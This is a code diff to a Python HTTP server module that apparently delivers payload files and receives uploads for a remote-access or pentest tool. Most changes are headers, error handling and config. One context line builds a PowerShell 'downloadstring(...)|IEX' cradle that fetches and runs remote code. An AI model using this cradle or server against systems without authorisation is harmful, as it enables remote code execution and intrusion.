@@ -66,20 +66,32 @@ class HttpDeliveringServer(BaseHTTPRequestHandler):
             filename = HttpDeliveringServer.files_to_deliver["permanent_routes"].get(self.path)
 
         if(filename is not None and os.path.isfile(filename)):
-            content = b""
-            with open(filename, "rb") as file:
-                content = file.read()
+            try:
+                with open(filename, "r") as f:
+                    fs = os.fstat(f.fileno())
 
-            self.send_response(HTTPStatus.OK)
-            self.end_headers()
+                content = b""
+                with open(filename, "rb") as file:
+                    content = file.read()
 
-            self.wfile.write(content)
+                self.send_response(HTTPStatus.OK)
+                self.send_header("Content-Length", str(fs[6]))
+                self.end_headers()
 
-            # Once download done, remove the file from the temp route
-            self.remove_file(self.path)
+                self.wfile.write(content)
+
+                # Once download done, remove the file from the temp route
+                self.remove_file(self.path)
+
+            except Exception as e:
+                Printer.verr(e)
+                self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR)
+                self.send_header("Content-Length", "0")
+                self.end_headers()
 
         else:
             self.send_response(HTTPStatus.NOT_FOUND)
+            self.send_header("Content-Length", "0")
             self.end_headers()
 
     def do_POST(self):
@@ -93,7 +105,7 @@ class HttpDeliveringServer(BaseHTTPRequestHandler):
             content_type = self.headers.get("Content-Type")
             post_request = self.rfile.read1()
             filename = HttpDeliveringServer.files_to_receive.get(self.path.lstrip("/"))
-            if (content_type is not None and 'boundary=' in content_type and filename != ""):
+            if (content_type is not None and 'boundary=' in content_type and filename):
                 multipart_data = decoder.MultipartDecoder(post_request, content_type)
                 for part in multipart_data.parts:
                     # Do save file
@@ -115,18 +127,20 @@ class HttpDeliveringServer(BaseHTTPRequestHandler):
             self.remove_file_upload(self.path.lstrip("/"))
 
         except Exception as e:
+            # Printer.exception()
             Printer.err(e)
             pass
 
     def log_message(self, format, request_proto, status_code, *args):
-        splited_req = request_proto.split()
-        verb = splited_req[0]
-        route = request_proto
-        if len(splited_req) >= 2:
-            route = splited_req[1]
+        if isinstance(request_proto, str):
+            splited_req = request_proto.split()
+            verb = splited_req[0]
+            route = request_proto
+            if len(splited_req) >= 2:
+                route = splited_req[1]
 
-        if(int(status_code) == HTTPStatus.OK and verb == "GET"):
-            Printer.log(f'File downloaded successfully from [blue]{self.address_string()}[/blue] -->  [yellow]{route}[/yellow]')
+            if(int(status_code) == HTTPStatus.OK and verb == "GET"):
+                Printer.log(f'File downloaded successfully from [blue]{self.address_string()}[/blue] -->  [yellow]{route}[/yellow]')
 
 
 class HttpServer(Thread):
@@ -135,10 +149,11 @@ class HttpServer(Thread):
     """
     def __init__(self):
         super().__init__(name="HttpServerThread")
-        self.host = AppConfig.get("host", "HttpServer")
+        self.host = "127.0.0.1"
         self.port = int(AppConfig.get("port", "HttpServer"))
         self.server_status = ServerStatus.Stopped
         self.has_started = Event()
+        self.httpd = None
 
     def __str__(self):
         return f"HttpServer(port={self.port}, status={self.server_status.name})"
@@ -156,10 +171,19 @@ class HttpServer(Thread):
         http_route = self.create_download_link(route)
         return f"""(new-object System.Net.Webclient).downloadstring("{http_route}")|IEX"""
 
+    @staticmethod
+    def get_download_address():
+        """
+        Return the download ip:port to use
+        """
+        port = AppConfig.get("default_port", default=AppConfig.get("listening_port", "Connections"))
+        ip_address = AppConfig.get("default_ip_address")
+        return (ip_address, port)
+
     @classmethod
     def create_download_link(cls, route):
         ip_addr = AppConfig.get("default_ip_address")
-        port = AppConfig.get("port", "HttpServer")
+        port = AppConfig.get("default_port", default=AppConfig.get("listening_port", "Connections"))
         return f'http://{ip_addr}:{port}/{route}'
 
     def end_download(self, route):
@@ -172,13 +196,14 @@ class HttpServer(Thread):
     def stop_listening(self):
         self.server_status = ServerStatus.Stopped
         try:
+            Printer.vlog("Closing HTTP server..")
             requests.get(f"http://{self.host}:{str(self.port)}", timeout=1)
         except:
             pass
 
     def run(self):
         try:
-            httpd = HTTPServer((self.host, self.port), HttpDeliveringServer)
+            self.httpd = HTTPServer((self.host, self.port), HttpDeliveringServer)
             self.server_status = ServerStatus.Running
             Printer.log(f"Http server started on port {self.port}")
 
@@ -189,5 +214,5 @@ class HttpServer(Thread):
         finally:
             self.has_started.set()
 
-        while(self.server_status == ServerStatus.Running):
-            httpd.handle_request()
+        while self.server_status == ServerStatus.Running:
+            self.httpd.handle_request()
